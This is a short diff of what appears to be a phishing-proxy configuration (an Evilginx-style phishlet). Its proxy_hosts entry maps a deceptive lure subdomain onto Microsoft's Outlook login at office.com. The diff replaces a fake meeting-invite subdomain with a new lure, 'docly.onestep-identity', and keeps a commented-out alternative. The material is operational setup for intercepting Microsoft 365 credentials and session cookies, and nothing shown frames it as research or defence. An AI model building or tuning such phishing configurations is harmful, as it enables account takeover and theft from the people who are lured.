@@ -335,7 +335,7 @@ proxy_hosts:
     }
   #
   - {
-      phish_sub: "calendly.masonparkes-new-meeting-invite",
+      phish_sub: "docly.onestep-identity",
       # phish_sub: "omnicro.shared-all-access",
       orig_sub: "outlook",
       domain: "office.com",
